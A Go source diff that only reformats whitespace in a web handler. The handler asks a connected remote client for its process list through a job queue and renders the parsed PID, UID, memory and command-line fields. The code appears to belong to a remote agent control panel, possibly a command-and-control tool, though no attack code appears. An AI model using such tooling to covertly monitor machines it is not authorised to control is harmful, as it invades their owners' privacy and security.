@@ -15,29 +15,29 @@ import (
 )
 
 type proc struct {
-  PID int64
-  PPID int64
-  UID int64
-  GID int64
-  VmSize uint64
-  Cmdline string
+	PID     int64
+	PPID    int64
+	UID     int64
+	GID     int64
+	VmSize  uint64
+	Cmdline string
 }
 
 func (p *proc) UsedMem() string {
-  // kb to bytes with *1024
-  return util.HumanizeSize(p.VmSize*1024)
+	// kb to bytes with *1024
+	return util.HumanizeSize(p.VmSize * 1024)
 }
 
 func newProc(s string) (*proc, error) {
 	var (
-		p   proc 
+		p     proc
 		sects []string
 		err   error
 	)
 
-  if !strings.Contains(s, "\\"){
-    return nil, fmt.Errorf("%s", s)
-  }
+	if !strings.Contains(s, "\\") {
+		return nil, fmt.Errorf("%s", s)
+	}
 
 	if sects = strings.Split(s, "\\"); len(sects) < 6 {
 		return nil, fmt.Errorf("process doesn't contain enough sections")
@@ -63,13 +63,13 @@ func newProc(s string) (*proc, error) {
 		return nil, fmt.Errorf("failed to parse the process vmsize: %s", err.Error())
 	}
 
-  for i := 5; i < len(sects); i++ {
-    p.Cmdline += sects[i]
-  }
+	for i := 5; i < len(sects); i++ {
+		p.Cmdline += sects[i]
+	}
 
-  if p.Cmdline == "" {
+	if p.Cmdline == "" {
 		return nil, fmt.Errorf("failed to parse the process cmdline")
-  }
+	}
 
 	return &p, nil
 }
@@ -79,23 +79,23 @@ func GET_ps(c *fiber.Ctx) error {
 		client *database.Client
 		jobs   *joblist.Type
 
-    res_str string
-    procs_str []string
+		res_str   string
+		procs_str []string
 
-		processes  []*proc
-    job *joblist.Job
-    proc *proc
+		processes []*proc
+		job       *joblist.Job
+		proc      *proc
 
-    err error
+		err error
 	)
 
 	client = c.Locals("client").(*database.Client)
 	jobs = c.Locals("joblist").(*joblist.Type)
 
-  data := util.NewBuffer("-")
+	data := util.NewBuffer("-")
 	res := util.NewBuffer()
 
-  if job, err = jobs.Add(client.ID, joblist.CMD_PS, data, res); err != nil {
+	if job, err = jobs.Add(client.ID, joblist.CMD_PS, data, res); err != nil {
 		log.Fail("failed to add process list job: %s", err.Error())
 		return util.RenderErr(c, "server error", http.StatusInternalServerError)
 	}
@@ -107,29 +107,29 @@ func GET_ps(c *fiber.Ctx) error {
 		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
 	}
 
-  res_str = res.String()
+	res_str = res.String()
 	procs_str = strings.Split(res_str, "\\\\")
 
-  for _, p := range procs_str {
-    if p == "" {
-      continue
-    }
+	for _, p := range procs_str {
+		if p == "" {
+			continue
+		}
 
 		if proc, err = newProc(p); err != nil {
 			log.Debg("failed to load the process for %s: %s", client.ID, err.Error())
-		  return util.RenderErr(c,
-			  fmt.Sprintf("process list job failed: %s", err.Error()), http.StatusGatewayTimeout,
-		  )
+			return util.RenderErr(c,
+				fmt.Sprintf("process list job failed: %s", err.Error()), http.StatusGatewayTimeout,
+			)
 		}
 
 		processes = append(processes, proc)
 	}
 
-  sort.Slice(processes, func(i, j int) bool {
+	sort.Slice(processes, func(i, j int) bool {
 		return processes[i].PID < processes[j].PID
 	})
 
-  return util.Render(c, "ps", fiber.Map{
+	return util.Render(c, "ps", fiber.Map{
 		"processes": processes,
 	})
 }
